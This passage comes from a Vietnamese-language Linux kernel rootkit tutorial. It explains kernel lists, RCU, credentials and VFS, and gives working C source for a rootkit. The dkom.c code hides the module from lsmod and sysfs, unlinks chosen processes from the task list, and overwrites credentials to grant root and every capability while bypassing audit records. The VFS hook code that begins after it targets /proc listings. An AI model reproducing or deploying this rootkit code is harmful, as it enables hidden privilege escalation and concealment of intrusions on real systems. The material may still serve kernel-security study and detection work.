  container_of(p, struct task_struct, tasks)
  = (struct task_struct *)((char *)p - offsetof(struct task_struct, tasks))
  = (struct task_struct *)((char *)p - 1208)
  = pointer toi dau struct task_struct

  Memory layout:
  ┌──────────────────────────────────────────────┐
  │  task_struct starts here                      │ ← ket qua container_of
  │  ...                                          │
  │  offset 1208: struct list_head tasks ─────────│ ← p (input)
  │  ...                                          │
  └──────────────────────────────────────────────┘
```

**list_add / list_del** — Chi la pointer manipulation:
```
list_del(&node):                    list_add(&new, &head):
                                    
  TRUOC:                              TRUOC:
  A ↔ node ↔ B                       head ↔ B
                                    
  SAU:                                SAU:
  A ↔ B                               head ↔ new ↔ B
  node.next = LIST_POISON1           
  node.prev = LIST_POISON2           

list_del_init(&node):               list_for_each_entry(pos, head, member):
                                    
  SAU:                                Iterate moi struct trong list:
  A ↔ B                               for (pos = container_of(head->next, type, member);
  node.next = &node  ← empty list         &pos->member != head;
  node.prev = &node                        pos = container_of(pos->member.next, type, member))
                                    
  Rootkit dung list_del_init thay     Tuong duong vong for iterate qua
  vi list_del de tranh poison         tat ca nodes trong circular list
  values bi detect boi forensics
```

**Tham khao source:** `include/linux/list.h` — toan bo implementation chi khoang 700 dong pure C macros.

#### 6.0.3 RCU (Read-Copy-Update) — Co che dong bo QUAN TRONG NHAT cho rootkits

RCU la co che dong bo dac biet cua Linux kernel, duoc thiet ke cho truong hop NHIEU READER, IT WRITER. Day la co che bao ve task list, module list, va hau het cac data structures ma rootkit can manipulate.

```
  Writer (vd: rootkit DKOM):         Reader (concurrent, vd: procfs):
  ════════════════════════           ════════════════════════════════

  1. Allocate new copy               rcu_read_lock()
     (hoac modify in-place               ← KHONG PHAI lock that!
      voi proper ordering)                ← Chi disable preemption
                                          ← Cuc ky NHANH (nanoseconds)
  2. Modify the copy                  
                                      ptr = rcu_dereference(gptr)
  3. rcu_assign_pointer(gptr, new)        ← doc pointer voi memory barrier
     (atomic pointer swap)                ← dam bao thay new data
     (memory barrier dam bao               hoac old data, KHONG BAO GIO
      readers thay consistent data)        thay partial/corrupt data

                                      su dung ptr->field1, ptr->field2...
                                      (an toan — data consistent)

  4. synchronize_rcu()                rcu_read_unlock()
     (BLOCK cho den khi TAT CA           ← re-enable preemption
      readers hien tai hoan thanh)       ← cung cuc ky NHANH

  5. Free old copy
     (bay gio an toan vi khong
      reader nao con dung old data)

  Timeline:
  ─────────────────────────────────────────────────────────────
  Writer:     [modify]──[publish]──────[wait]──────────[free]
  Reader 1:          [rcu_lock]──[read old]──[unlock]
  Reader 2:                  [rcu_lock]──[read new]──[unlock]
  Reader 3:            [rcu_lock]──[read old]──[unlock]
                                                      ↑
                               synchronize_rcu() doi den day
                               (tat ca readers truoc publish
                                da unlock)
```

**Tai sao rcu_read_lock() KHONG phai lock that?**
```c
// include/linux/rcupdate.h (simplified):
static inline void rcu_read_lock(void)
{
    preempt_disable();      // Chi disable preemption!
    // KHONG co spinlock, mutex, hay bat ky blocking nao
    // KHONG co cache line bouncing (khong shared variable)
    // KHONG co memory barrier (tren most architectures)
    // → Cuc ky nhanh — gan nhu zero cost
}

static inline void rcu_read_unlock(void)
{
    preempt_enable();       // Re-enable preemption
}
```

**Ung dung cho DKOM — tai sao can ca RCU VA tasklist_lock:**
```
  Doc task list (procfs, OOM killer):     Modify task list (DKOM rootkit):
  ───────────────────────────────────     ─────────────────────────────────
  rcu_read_lock();                        write_lock_irq(&tasklist_lock);
  // hoac read_lock(&tasklist_lock);      
  for_each_process(p) {                   list_del_init(&task->tasks);
      // su dung p->pid, p->comm...       
  }                                       write_unlock_irq(&tasklist_lock);
  rcu_read_unlock();
  // hoac read_unlock(&tasklist_lock);

  RCU bao ve: task_struct KHONG bi freed khi dang doc
  tasklist_lock bao ve: list structure KHONG bi modified khi dang iterate
  
  Rootkit PHAI acquire write_lock_irq(&tasklist_lock) truoc khi
  list_del — neu khong, concurrent reader co the thay broken pointers
  → kernel crash (NULL deref hoac use-after-free)
```

**Tham khao source:** `include/linux/rcupdate.h`, `kernel/rcu/` directory. Documentation: `Documentation/RCU/`

#### 6.0.4 struct cred — Credential model trong Linux kernel

Moi process co 2 sets of credentials, duoc tro toi boi `task_struct->cred` va `task_struct->real_cred`. Defined trong `include/linux/cred.h`:

```
struct cred (include/linux/cred.h):
┌──────────────────────────────────────────────────────────────┐
│ atomic_t usage;              — reference count               │
│                                (nhieu processes co the share │
│                                 cung cred qua COW/fork)      │
│                                                              │
│ ┌──────────────────────────────────────────────────────────┐ │
│ │ User/Group IDs — ROOTKIT SET TAT CA = 0 DE CO ROOT      │ │
│ │                                                          │ │
│ │ kuid_t uid;    — real user ID                            │ │
│ │ kuid_t euid;   — effective user ID (dung cho perm check) │ │
│ │ kuid_t suid;   — saved set-user-ID                       │ │
│ │ kuid_t fsuid;  — filesystem user ID (file access check)  │ │
│ │                                                          │ │
│ │ kgid_t gid;    — real group ID                           │ │
│ │ kgid_t egid;   — effective group ID                      │ │
│ │ kgid_t sgid;   — saved set-group-ID                      │ │
│ │ kgid_t fsgid;  — filesystem group ID                     │ │
│ └──────────────────────────────────────────────────────────┘ │
│                                                              │
│ ┌──────────────────────────────────────────────────────────┐ │
│ │ Linux Capabilities — fine-grained privileges             │ │
│ │                                                          │ │
│ │ kernel_cap_t cap_inheritable; — preserved across execve  │ │
│ │ kernel_cap_t cap_permitted;   — ceiling cho effective     │ │
│ │ kernel_cap_t cap_effective;   ← THUC SU DUNG de check    │ │
│ │ kernel_cap_t cap_bset;        — bounding set             │ │
│ │ kernel_cap_t cap_ambient;     — ambient capabilities     │ │
│ │                                                          │ │
│ │ Rootkit set TAT CA = CAP_FULL_SET de co moi quyen:       │ │
│ │   CAP_SYS_ADMIN, CAP_NET_RAW, CAP_SYS_PTRACE,           │ │
│ │   CAP_DAC_OVERRIDE, CAP_SYS_MODULE, ...                  │ │
│ │   (tong cong ~40 capabilities)                           │ │
│ └──────────────────────────────────────────────────────────┘ │
│                                                              │
│ struct user_struct *user;    — user accounting info          │
│ struct group_info *group_info; — supplementary groups        │
│ struct rcu_head rcu;         — RCU callback for deferred free│
│ struct user_namespace *user_ns; — user namespace             │
│ ...                                                          │
└──────────────────────────────────────────────────────────────┘

Credential model rules (kernel design):
──────────────────────────────────────
1. cred la IMMUTABLE sau khi commit — tat ca modifications
   phai qua prepare_creds() → modify → commit_creds()
2. Truc tiep modify cred (DKOM) VIOLATES rule nay
   → co the race voi concurrent readers
3. Nhung trong practice, rootkit modify thanh cong vi:
   - Writes toi aligned fields la atomic tren x86
   - Race window cuc ky nho
   - Worst case: process tam thoi co mixed old/new creds
```

**Phan biet uid/euid/suid/fsuid:**
```
uid   — "Toi la ai"        (real identity, set khi login)
euid  — "Toi co quyen gi"  (dung cho permission checks)
suid  — "Toi co the quay lai lam ai" (saved cho setuid programs)
fsuid — "Toi truy cap file voi quyen gi" (thuong = euid)

Root = tat ca = 0. Rootkit set het 8 fields (uid/gid/euid/egid/suid/sgid/fsuid/fsgid) = 0.
Chi set uid=0 ma khong set euid=0 → van khong co quyen root thuc su.
Chi set euid=0 ma khong set capabilities → thieu mot so quyen (vd: raw socket).
→ Rootkit PHAI set ca 8 IDs = 0 VA 5 capability sets = CAP_FULL_SET.
```

#### 6.0.5 Kobject va sysfs — Module visibility trong /sys/

Moi kernel module co mot `struct module` (include/linux/module.h) chua `mkobj` (module kobject) → tao entry tai `/sys/module/MODULE_NAME/`.

```
Module visibility chain:

  struct module (THIS_MODULE)
  │
  ├── list (struct list_head)
  │   └── Links vao global module list
  │       → /proc/modules, lsmod doc list nay
  │       → list_del_init() xoa khoi day
  │
  └── mkobj (struct module_kobject)
      └── kobj (struct kobject)
          └── Tao entry trong sysfs: /sys/module/MODULE_NAME/
              ├── parameters/     — module params
              ├── sections/       — ELF section addresses
              ├── notes/          — build ID
              └── holders/        — modules depending on this
          → kobject_del() xoa entry nay

  De an module hoan toan, rootkit phai:
  1. list_del_init(&THIS_MODULE->list)   → an khoi lsmod, /proc/modules
  2. kobject_del(&THIS_MODULE->mkobj.kobj) → an khoi /sys/module/
  
  Sau khi xoa, module code VAN trong memory, VAN execute.
  Chi la khong co trong bat ky listing nao.
```

**Tham khao source:** `include/linux/kobject.h`, `include/linux/module.h`, `lib/kobject.c`

---

```c
/* dkom.c — Direct Kernel Object Manipulation
 *
 * DKOM = Thay doi kernel data structures truc tiep, KHONG hook function.
 *
 * Tai sao DKOM dang so:
 *   1. KHONG thay doi code → code integrity checks PASS
 *   2. KHONG hook function → hook detection tools PASS
 *   3. Nhanh — chi modify vai pointers
 *   4. Kho detect ngoai tru memory forensics
 *
 * Tai sao DKOM kho:
 *   1. Phai biet exact struct layout (thay doi theo kernel version)
 *   2. Race conditions — can proper locking
 *   3. Inconsistency detection — cross-view analysis se phat hien
 *   4. Potential crash neu kernel iterate modified structures
 *
 * APT su dung: hau het kernel rootkits dung DKOM it nhat cho
 * module hiding (list_del). Advanced rootkits dung DKOM cho
 * process hiding, credential manipulation.
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * MODULE HIDING via DKOM
 *
 * Kernel module list la doubly-linked list:
 *   module1 ↔ module2 ↔ rootkit ↔ module3
 *
 * Sau DKOM:
 *   module1 ↔ module2 ↔ module3
 *   rootkit (orphaned — khong ai reference, nhung code van trong memory)
 *
 * An khoi:
 *   - lsmod (doc module list)
 *   - /proc/modules (doc module list)
 *   - /sys/module/MODULE_NAME (kobject tree)
 *   - modinfo MODULE_NAME (can module trong list)
 * ══════════════════════════════════════════════════════════════ */

/* Save pointers de co the restore (show module lai cho rmmod) */
static struct list_head *saved_prev_module = NULL;
static bool module_is_hidden = false;

/*
 * An module hien tai khoi tat ca views.
 *
 * Phai an tu 3 noi:
 * 1. Module list (THIS_MODULE->list) — lsmod, /proc/modules
 * 2. Kobject tree (THIS_MODULE->mkobj.kobj) — /sys/module/
 * 3. Module section attributes — /sys/module/MODULE/sections/
 */
void rk_hide_module(void)
{
    if (module_is_hidden)
        return;

    /* Save previous node de restore sau.
     *
     * List structure:
     *   prev ↔ THIS_MODULE ↔ next
     *
     * saved_prev_module = prev → dung khi can re-insert.
     */
    saved_prev_module = THIS_MODULE->list.prev;

    /* 1. Xoa khoi module list.
     *
     * list_del_init():
     *   - Unlink node khoi doubly-linked list
     *     prev->next = next
     *     next->prev = prev
     *   - Init node: next = prev = &self (empty list)
     *
     * Tai sao list_del_init thay vi list_del:
     *   list_del set next/prev = LIST_POISON1/2 — debug values.
     *   Neu ai check list structure → phat hien poison values.
     *   list_del_init set next/prev = &self → looks like empty list.
     *
     * Sau dong nay:
     *   - lsmod KHONG thay module
     *   - /proc/modules KHONG co entry
     *   - Nhung module code VAN trong memory, VAN execute
     */
    list_del_init(&THIS_MODULE->list);

    /* 2. Xoa khoi kobject tree (/sys/module/).
     *
     * kobject = kernel object representation cho sysfs.
     * Moi module co kobject tai /sys/module/MODULE_NAME/
     * chua: parameters, sections, notes, etc.
     *
     * kobject_del() removes sysfs entry:
     *   - /sys/module/rk/ bien mat
     *   - ls /sys/module/ khong liet ke
     *
     * CANH BAO: sau kobject_del, khong the dung sysfs features.
     * Module parameters qua sysfs se khong accessible. */
    kobject_del(&THIS_MODULE->mkobj.kobj);

    /* 3. (Optional) Xoa khoi /proc/modules text output.
     *
     * /proc/modules output generated tu module list iteration.
     * list_del o tren da handle dieu nay.
     * Nhung neu paranoid: hook seq_show cua /proc/modules. */

    module_is_hidden = true;
    pr_info("rk: module hidden\n");
}

/*
 * Hien module lai — can truoc khi rmmod.
 *
 * rmmod goi find_module(name) → iterate module list → tim module.
 * Neu module khong trong list → rmmod bao "module not found".
 *
 * Flow de unload:
 *   1. Trigger show (kill -54 31338)
 *   2. rmmod rk
 *   3. Module exit handler cleanup hooks
 */
void rk_show_module(void)
{
    if (!module_is_hidden || !saved_prev_module)
        return;

    /* Re-insert vao module list SAU node da save.
     *
     * list_add(&THIS_MODULE->list, saved_prev_module):
     *   Insert THIS_MODULE after saved_prev_module.
     *   saved_prev → THIS_MODULE → (original next)
     *
     * Module gio visible lai cho lsmod, /proc/modules. */
    list_add(&THIS_MODULE->list, saved_prev_module);

    /* Kobject KHONG restore — sysfs entry da bi destroy.
     * Tao lai kobject phuc tap va khong can thiet cho rmmod.
     * rmmod chi can module trong list, khong can sysfs. */

    module_is_hidden = false;
    pr_info("rk: module shown\n");
}

/* ══════════════════════════════════════════════════════════════
 * PROCESS HIDING via DKOM
 *
 * Cach ps/top hoat dong:
 *   1. Mo /proc (procfs directory)
 *   2. getdents64 → list tat ca entries (bao gom PID directories)
 *   3. Moi PID directory → read status, stat, cmdline, etc.
 *
 * Syscall table hook (Chapter 3) an o buoc 2 (filter getdents64).
 * DKOM an o level sau hon: xoa process khoi internal list.
 *
 * Linux process list:
 *   init_task.tasks ↔ task1.tasks ↔ task2.tasks ↔ ... ↔ init_task.tasks
 *   (Circular doubly-linked list, anchored at init_task)
 *
 * Xoa task khoi list:
 *   - for_each_process() khong thay → /proc/PID khong generated
 *   - ps, top, htop khong thay
 *   - kill PID van work (kernel con hash table rieng cho PID lookup)
 *   - Process VAN chay (scheduler dung run queue, khong phai task list)
 * ══════════════════════════════════════════════════════════════ */

/* Saved state cho process unhiding.
 *
 * Luu task_struct pointer (pinned via get_task_struct) thay vi
 * saved_prev pointer, vi task truoc do co the da exit va
 * task_struct bi freed → dung saved_prev se UAF. */
struct hidden_proc {
    pid_t pid;
    struct task_struct *task;   /* Pinned reference via get_task_struct */
    struct hidden_proc *next;
};

static struct hidden_proc *hidden_proc_list = NULL;
static DEFINE_SPINLOCK(proc_hide_lock);

void rk_hide_process(pid_t pid)
{
    struct task_struct *task;
    struct hidden_proc *hp;
    rwlock_t *tasklist_lockp;

    /* Lookup tasklist_lock — unexported symbol, phai dung
     * rk_lookup_name (kallsyms_lookup_name wrapper).
     *
     * tasklist_lock la rwlock bao ve task list.
     * Moi code modify task list (fork, exit) acquire write lock.
     * Moi code iterate task list (procfs, OOM) acquire read lock.
     * Ta phai acquire write lock de modify list safely. */
    tasklist_lockp = (rwlock_t *)rk_lookup_name("tasklist_lock");
    if (!tasklist_lockp) return;

    /* Tim task_struct by PID.
     *
     * rcu_read_lock(): bat dau RCU read-side critical section.
     * Task structures duoc protect boi RCU — dam bao task
     * khong bi freed trong khi ta dang access.
     *
     * find_vpid(): tim struct pid trong PID namespace.
     * pid_task(): convert struct pid → task_struct.
     * PIDTYPE_PID: tim theo PID (khong phai PGID hay SID). */
    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);

    if (!task) {
        rcu_read_unlock();
        pr_warn("rk: PID %d not found\n", pid);
        return;
    }

    /* Pin task_struct bang get_task_struct.
     * Tang reference count → task_struct khong bi freed
     * ngay ca khi process exit. Ta can giu reference nay
     * de re-insert task vao list khi show. */
    get_task_struct(task);
    rcu_read_unlock();

    /* Save state cho unhiding */
    hp = kzalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp) {
        put_task_struct(task);
        return;
    }

    hp->pid = pid;
    hp->task = task;   /* Giu pinned reference */

    /* Xoa khoi task list voi proper write locking.
     *
     * write_lock_irq(tasklist_lockp):
     *   1. Disable local interrupts (tranh deadlock voi IRQ handlers)
     *   2. Acquire write lock (exclusive — block ALL readers AND writers)
     *
     * Tai sao write_lock thay vi rcu_read_lock:
     *   RCU read lock chi protect readers — KHONG protect writers.
     *   list_del_init modify list pointers — day la WRITE operation.
     *   Concurrent for_each_process (OOM killer, procfs) dung read lock
     *   se thay corrupt list neu ta modify ma khong hold write lock.
     *
     * CANH BAO QUAN TRONG:
     *   list_del tren task->tasks CO THE gay issues:
     *   1. Mot so kernel code iterate task list (OOM killer, procfs)
     *      → crash neu gap broken list
     *   2. Process accounting tool ghi log → miss hidden process
     *   3. waitpid() cho child processes co the bi anh huong
     *
     *   Trong production rootkit (APT), thuong dung getdents64 hook
     *   thay vi DKOM cho process hiding — it risky hon.
     *   DKOM process hiding chu yeu dung cho research/demo. */
    write_lock_irq(tasklist_lockp);
    list_del_init(&task->tasks);
    write_unlock_irq(tasklist_lockp);

    /* Add vao hidden process list */
    spin_lock(&proc_hide_lock);
    hp->next = hidden_proc_list;
    hidden_proc_list = hp;
    spin_unlock(&proc_hide_lock);

    pr_info("rk: PID %d hidden via DKOM\n", pid);
}

void rk_show_process(pid_t pid)
{
    struct hidden_proc **pp, *hp;
    rwlock_t *tasklist_lockp;
    struct list_head *init_head;

    tasklist_lockp = (rwlock_t *)rk_lookup_name("tasklist_lock");
    if (!tasklist_lockp) return;

    /* Lay init_task list head de re-insert.
     * Re-insert tai head of task list (after init_task).
     * Position khong quan trong cho correctness —
     * for_each_process dung list iteration, khong ordering. */
    init_head = &((struct task_struct *)rk_lookup_name("init_task"))->tasks;
    if (!init_head) return;

    spin_lock(&proc_hide_lock);
    for (pp = &hidden_proc_list; *pp; pp = &(*pp)->next) {
        if ((*pp)->pid == pid) {
            hp = *pp;
            *pp = hp->next;
            spin_unlock(&proc_hide_lock);

            /* Re-insert task vao list tai init_task head.
             *
             * Dung write_lock_irq vi modify list structure.
             * list_add(&task->tasks, init_head) insert task
             * ngay SAU init_task trong circular list. */
            write_lock_irq(tasklist_lockp);
            list_add(&hp->task->tasks, init_head);
            write_unlock_irq(tasklist_lockp);

            /* Release pinned reference */
            put_task_struct(hp->task);
            kfree(hp);
            pr_info("rk: PID %d shown via DKOM\n", pid);
            return;
        }
    }
    spin_unlock(&proc_hide_lock);
}

/* ══════════════════════════════════════════════════════════════
 * CREDENTIAL MANIPULATION via DKOM
 *
 * Thay vi prepare_creds/commit_creds (API approach),
 * truc tiep modify cred struct trong memory.
 *
 * TAI SAO KHONG NEN LAM CACH NAY:
 *   - cred struct la immutable by design (multiple readers via RCU)
 *   - Truc tiep modify → race condition voi code dang doc cred
 *   - prepare_creds/commit_creds handle locking dung cach
 *
 * TAI SAO VAN DEMO:
 *   - Hieu sau hon ve credential model
 *   - Mot so rootkit thuc te dung cach nay
 *   - Bypasses audit logging (commit_creds co audit hook)
 * ══════════════════════════════════════════════════════════════ */

static void rk_dkom_give_root(struct task_struct *task)
{
    struct cred *cred;

    /* current->cred la const pointer — khong the modify truc tiep.
     * Cast bo const = undefined behavior theo C standard.
     * Nhung trong kernel context, ta co toan quyen memory access. */
    cred = (struct cred *)task->cred;

    /* Truc tiep overwrite credential fields.
     * KHONG qua prepare_creds/commit_creds:
     *   + Khong tao audit record (stealthier)
     *   + Khong allocate memory (no failure case)
     *   - Potential race condition
     *   - Violates kernel credential model
     *   - Co the corrupt state neu concurrent reader */

    cred->uid.val = 0;
    cred->gid.val = 0;
    cred->euid.val = 0;
    cred->egid.val = 0;
    cred->suid.val = 0;
    cred->sgid.val = 0;
    cred->fsuid.val = 0;
    cred->fsgid.val = 0;

    cred->cap_effective = CAP_FULL_SET;
    cred->cap_permitted = CAP_FULL_SET;
    cred->cap_inheritable = CAP_FULL_SET;
    cred->cap_bset = CAP_FULL_SET;
    cred->cap_ambient = CAP_FULL_SET;
}
```

---

## Chapter 7: VFS Layer Hooking

### 7.0 VFS Architecture — An file tan tang filesystem

Truoc khi hieu code VFS hooking, ban can nam duoc cach Linux kernel to chuc filesystem access. VFS (Virtual File System) la lop truu tuong cho phep kernel lam viec voi nhieu loai filesystem (ext4, xfs, btrfs, procfs, sysfs, tmpfs...) qua mot giao dien thong nhat.

#### 7.0.1 VFS 4-Layer Model

```
  Application: open("/home/user/secret.txt", O_RDONLY)
       │
       │  syscall: sys_openat() → do_sys_openat2()
       │
       ▼
  ┌─── VFS Layer ─────────────────────────────────────────────────────┐
  │                                                                    │
  │  Path Lookup (fs/namei.c — path_lookupat):                        │
  │    "/" → lookup dentry cache (dcache)                               │
  │         hit? → dung cached dentry                                  │
  │         miss? → goi filesystem .lookup()                           │
  │    "home" → lookup dentry for "home" under "/"                     │
  │    "user" → lookup dentry for "user" under "home"                  │
  │    "secret.txt" → lookup final component                           │
  │                                                                    │
  │  Moi component: resolve dentry → get inode → check permission      │
  │  Cuoi cung: tao struct file, gan file_operations tu inode          │
  │                                                                    │
  │  readdir/getdents64 (doc noi dung directory):                      │
  │    sys_getdents64() → iterate_dir(file, ctx)                       │
  │      → file->f_op->iterate_shared(file, ctx)                      │
  │                          ↑                                         │
  │                   ROOTKIT HOOK POINT                                │
  └────────────────────────────────────────────────────────────────────┘
       │
       ▼
  ┌─── Filesystem Layer (ext4, xfs, procfs, sysfs) ───────────────────┐
  │                                                                    │
  │  Moi filesystem implement cac operations:                          │
  │    .iterate_shared()  — readdir (liet ke directory entries)         │
  │    .lookup()          — tim inode theo ten trong directory          │
  │    .read_iter()       — doc noi dung file                          │
  │    .write_iter()      — ghi noi dung file                          │
  │    .open()            — xu ly khi file duoc mo                     │
  │                                                                    │
  │  procfs (/proc):                                                   │
  │    iterate_shared → liet ke PID directories + pseudo-files         │
  │    Rootkit hook iterate_shared cua /proc → an PID directories      │
  │                                                                    │
  │  ext4/xfs (filesystem that):                                       │
  │    iterate_shared → doc disk blocks chua directory entries          │
  │    Rootkit hook iterate_shared → an files tren disk                 │
  └────────────────────────────────────────────────────────────────────┘
       │
       ▼
  ┌─── Block Layer / Page Cache ──────────────────────────────────────┐
  │                                                                    │
  │  Page Cache: cache file data trong RAM                             │
  │  Block Layer: bio requests, I/O scheduler, device driver           │
  │  → Rootkit THUONG KHONG hook o day (qua sau, phuc tap)             │
  └────────────────────────────────────────────────────────────────────┘
```

#### 7.0.2 Key VFS Structures

4 struct chinh tao thanh VFS — hieu moi quan he giua chung la THEN CHOT de hieu VFS hooking:

```
  struct super_block (fs/super.c)
  ┌──────────────────────────────────────────────────────┐
  │ MOT per mounted filesystem instance                   │
  │                                                      │
  │ s_type     — filesystem type (ext4_fs_type, proc_fs) │
  │ s_root     — dentry cua mount point                  │
  │ s_bdev     — block device (NULL cho pseudo-fs)       │
  │ s_op       — super_operations (alloc_inode, etc.)    │
  │ s_flags    — mount flags (MS_RDONLY, etc.)            │
  └──────────────────────────────────────────────────────┘
         │ s_root
         ▼
  struct dentry (include/linux/dcache.h)
  ┌──────────────────────────────────────────────────────┐
  │ MOT per path component TRONG CACHE                    │
  │ (co the nhieu dentries tro toi cung inode — hardlinks)│
  │                                                      │
  │ d_name     — ten component (vd: "home", "secret.txt")│
  │ d_inode    — pointer toi inode ←──────────────┐      │
  │ d_parent   — parent dentry                    │      │
  │ d_subdirs  — list of child dentries           │      │
  │ d_op       — dentry_operations                │      │
  │                                               │      │
  │ Tao thanh directory tree trong memory:        │      │
  │   dentry("/") → dentry("home") → dentry("user")     │
  └──────────────────────────────────────────────────────┘
         │ d_inode                                │
         ▼                                        │
  struct inode (include/linux/fs.h)               │
  ┌──────────────────────────────────────────────────────┐
  │ MOT per file/directory TREN DISK                      │
  │ (persistent metadata — ton tai khi khong open)        │
  │                                                      │
  │ i_ino      — inode number                            │
  │ i_mode     — permissions + file type (S_IFREG, etc.) │
  │ i_uid/gid  — owner                                  │
  │ i_size     — file size                               │
  │ i_atime/mtime/ctime — timestamps                    │
  │ i_op       — inode_operations (lookup, permission)   │
  │ i_fop      — default file_operations ←───────┐      │
  │              (copy vao struct file khi open)  │      │
  └──────────────────────────────────────────────────────┘
         │ i_fop                                  │
         ▼                                        │
  struct file (include/linux/fs.h)                │
  ┌──────────────────────────────────────────────────────┐
  │ MOT per open file descriptor                          │
  │ (per-process, per-open — transient)                   │
  │                                                      │
  │ f_path     — dentry + mount point                    │
  │ f_inode    — inode pointer                           │
  │ f_pos      — current read/write position (loff_t)    │
  │ f_flags    — O_RDONLY, O_WRONLY, etc.                 │
  │ f_mode     — FMODE_READ, FMODE_WRITE                 │
  │ f_op       — file_operations ← ═══ HOOK TARGET ═══  │
  │              (copy tu inode->i_fop khi open)         │
  │              .iterate_shared = readdir handler       │
  │              .read_iter = read handler               │
  │              .write_iter = write handler              │
  └──────────────────────────────────────────────────────┘
```

#### 7.0.3 Directory Iteration Mechanism — Chi tiet tung buoc

Khi user chay `ls /proc`, day la CHINH XAC nhung gi xay ra trong kernel, va rootkit hook o dau:

```
  Userspace: ls /proc
       │
       │ syscall: getdents64(fd, buf, count)
       ▼
  Kernel: sys_getdents64() (fs/readdir.c)
       │
       ▼
  iterate_dir(file, ctx)                    ← ctx->actor = filldir64
       │
       ▼
  file->f_op->iterate_shared(file, ctx)     ← ROOTKIT REPLACES THIS
       │                                       voi hooked_proc_iterate()
       │  (filesystem-specific implementation)
       │  (cho /proc: proc_root_readdir)
       │
       ▼
  Filesystem iterate moi entry:
       │
       ├── dir_emit(ctx, "1", 1, ino, DT_DIR)     → ctx->actor("1")    PID 1
       ├── dir_emit(ctx, "2", 1, ino, DT_DIR)     → ctx->actor("2")    PID 2
       ├── dir_emit(ctx, "1337", 4, ino, DT_DIR)  → ctx->actor("1337") PID 1337
       │                                               ↑
       │                                    ROOTKIT'S FILLDIR:
       │                                    "1337 la hidden PID?"
       │                                    "YES → return SKIP"
       │                                    → entry KHONG ghi vao user buffer
       │                                    → ls KHONG thay PID 1337
       │
       ├── dir_emit(ctx, "cpuinfo", 7, ino, DT_REG)
       ├── dir_emit(ctx, "meminfo", 7, ino, DT_REG)
       └── ...

  ctx->actor (filldir callback):
    Goi boi filesystem cho MOI directory entry
    Ghi entry vao user buffer (getdents64 output)
    Return: continue/stop iteration

  Rootkit strategy:
    1. Hook file->f_op->iterate_shared → hooked_proc_iterate
    2. hooked_proc_iterate tao wrapper dir_context voi custom actor
    3. Custom actor (rk_proc_filldir) nhan MOI entry
    4. Check neu entry can an → skip (khong goi original actor)
    5. Entry khong an → goi original actor (pass through)
```

#### 7.0.4 container_of Deep Dive — Vi du cu the trong VFS hook code

Day la vi du thuc te ve cach rootkit dung `container_of` trong VFS hook. Hieu sai macro nay = memory corruption = kernel crash:

```c
/* Rootkit dinh nghia struct nay: */
struct rk_filldir_data {
    struct dir_context ctx;        /* offset 0 — vi la field dau tien */
    struct dir_context *orig_ctx;  /* offset 16 (sizeof(dir_context) = 16) */
};

/* Trong rk_proc_filldir, kernel goi voi pointer toi ctx field: */
static filldir_ret_t rk_proc_filldir(struct dir_context *ctx, ...)
{
    /* ctx tro toi truong ctx BEN TRONG rk_filldir_data.
     * Ta can lay pointer toi rk_filldir_data de access orig_ctx. */
    
    struct rk_filldir_data *data =
        container_of(ctx, struct rk_filldir_data, ctx);
    
    /* Phan tich macro: */
    /* container_of(ctx, struct rk_filldir_data, ctx)
     * = (struct rk_filldir_data *)((char *)ctx - offsetof(struct rk_filldir_data, ctx))
     * = (struct rk_filldir_data *)((char *)ctx - 0)
     *                                             ↑
     *                           offsetof = 0 vi ctx la field dau tien!
     * = (struct rk_filldir_data *)ctx
     *
     * Trong truong hop nay, vi ctx la field dau tien (offset 0),
     * container_of don gian chi la cast. Nhung KHONG nen bo qua
     * container_of va cast truc tiep — neu struct layout thay doi
     * (them field truoc ctx), cast se SAI nhung container_of van DUNG.
     */
    
    /* Memory layout:
     *
     * Address:     rk_filldir_data struct
     * 0x1000:  ┌── ctx.actor (function pointer, 8 bytes)   ─┐
     *          │                                              │ dir_context
     * 0x1008:  │   ctx.pos (loff_t, 8 bytes)                ─┘
     * 0x1010:  │   orig_ctx (pointer, 8 bytes)   ← data->orig_ctx
     *          └──
     *
     * ctx parameter points to 0x1000
     * container_of returns 0x1000 (= 0x1000 - 0)
     * data->orig_ctx reads from 0x1010
     */
}
```

**CANH BAO QUAN TRONG:** Khi goi original filldir, PHAI pass `data->orig_ctx` (original context), KHONG PHAI `&data->ctx` (wrapper context). Original filldir co the dung `container_of` tren context nhan duoc — neu pass wrapper context, no se tinh offset SAI va doc/ghi vao wrong memory location → kernel crash hoac data corruption.

**Tham khao source:** `include/linux/fs.h` (struct file, struct inode, file_operations), `fs/readdir.c` (iterate_dir, filldir64), `fs/namei.c` (path lookup), `include/linux/dcache.h` (struct dentry)

---

```c
/* vfs_hook.c — VFS (Virtual File System) layer hooking
 *
 * Hook o VFS layer = sau hon syscall table hook.
 *
 * Hierarchy:
 *   Syscall: sys_getdents64 → vfs_readdir → file->f_op->iterate_shared
 *   Hook tai f_op level bypass detection dua tren syscall table check.
 *
 * VFS Architecture:
 *   Moi open file → struct file → f_op (file_operations)
 *   f_op chua function pointers cho moi operation tren file.
 *
 *   Cu the cho directories:
 *   f_op->iterate_shared() = read directory entries
 *   Hook iterate_shared → control output cua readdir/getdents
 *
 * procfs (/proc) dung VFS — moi /proc entry co rieng f_op.
 * Hook f_op cua /proc root directory → control /proc listing
 * → an process ma khong can hook syscall table.
 */

#include "rootkit.h"
#include <linux/version.h>

/* ══════════════════════════════════════════════════════════════
 * KERNEL VERSION COMPATIBILITY
 *
 * filldir_t return value thay doi giua kernel versions:
 *   Kernel < 6.1: filldir_t returns int
 *     0     = success, tiep tuc iterate
 *     non-0 = error, DUNG iterate
 *
 *   Kernel >= 6.1: filldir_t returns bool
 *     true  = continue iteration
 *     false = stop iteration
 *
 * Neu dung sai return value:
 *   Tra true tren kernel < 6.1 = "error, stop" = TAT CA entries
 *   sau entry hidden dau tien deu invisible.
 * ══════════════════════════════════════════════════════════════ */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
  #define FILLDIR_SKIP   true    /* true = continue iteration */
  #define FILLDIR_EMIT   true
  typedef bool filldir_ret_t;
#else
  #define FILLDIR_SKIP   0       /* 0 = success/continue */
  #define FILLDIR_EMIT   0
  typedef int filldir_ret_t;
#endif

/* ══════════════════════════════════════════════════════════════
 * Hook iterate_shared tren /proc directory
 *
 * Khi ls /proc, kernel goi:
 *   proc_root.f_op->iterate_shared(file, ctx)
 *
 * iterate_shared dung callback pattern:
